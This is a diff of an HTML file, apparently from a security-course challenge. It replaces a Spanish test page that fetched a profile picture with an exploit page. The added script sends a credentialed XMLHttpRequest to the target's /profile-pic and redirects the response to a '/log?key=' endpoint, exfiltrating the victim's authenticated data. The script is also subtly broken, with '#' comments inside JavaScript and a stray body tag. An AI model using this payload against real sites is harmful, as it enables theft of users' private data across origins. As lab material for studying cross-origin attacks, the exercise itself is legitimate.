@@ -1,36 +1,27 @@
-<!doctype html>
-<html lang="es">
-<head><meta charset="utf-8"><title>Test cookie p1</title></head>
-<body>
-<button id="go">Probar fetch con cookie de p1</button>
-<pre id="out"></pre>
-<script>
-const out = document.getElementById('out');
-const P1 = 'https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic'; // ajustá
+<html>
+  <body>
+    <script>
 
-document.getElementById('go').onclick = async () => {
-  out.textContent = 'Haciendo fetch...';
-  try {
-    const resp = await fetch(P1, { credentials: 'include' });
-    out.textContent += '\nStatus: ' + resp.status;
-    const ct = resp.headers.get('content-type') || '';
-    out.textContent += '\nContent-Type: ' + ct;
+    #Initialize the XMLHttpRequest object, and the application URL vairable 
+        var req = new XMLHttpRequest();
+        var url = ("https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar");
 
-    const blob = await resp.blob();
-    if (ct.startsWith('image/')) {
-      const url = URL.createObjectURL(blob);
-      const img = new Image();
-      img.src = url;
-      document.body.appendChild(img);
-    } else {
-      out.textContent += '\nNo es imagen (probablemente HTML de login).';
-      const text = await blob.text();
-      console.log(text.slice(0,200)); // muestra primeros bytes
-    }
-  } catch (e) {
-    out.textContent = 'Error: ' + e;
-  }
-};
-</script>
-</body>
+    #MLHttpRequest object loads, exectutes reqListener() function
+      req.onload = retrieveKeys;
+
+    #Make GET request to the application accounDetails location
+        req.open('GET', url + "/profile-pic",true);
+
+    #Allow passing credentials with the requests
+    req.withCredentials = true;
+
+    #Send the request 
+        req.send(null);
+
+    function retrieveKeys() {
+            location='/log?key='+this.responseText;
+        };
+
+  </script>
+  <body>
 </html>
